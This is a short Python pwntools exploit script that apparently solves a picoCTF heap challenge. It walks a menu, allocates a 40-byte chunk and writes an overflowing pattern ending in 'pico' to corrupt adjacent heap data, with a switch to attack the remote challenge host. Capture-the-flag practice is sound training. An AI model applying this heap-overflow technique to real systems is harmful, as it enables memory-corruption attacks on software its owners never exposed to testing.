from pwn import *

exe = ELF('./chall')
context.binary = exe.path
io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *free
        continue
    """)
elif args.REMOTE:
    io = remote('tethys.picoctf.net', 59084)

io.sendlineafter(b':', b'5')
io.sendlineafter(b':', b'2')
io.sendlineafter(b':', b'40')
io.sendlineafter(b':', b'aaaabaaacaaadaaaeaaafaaagaaahapico')
io.sendlineafter(b':', b'4')
io.interactive()

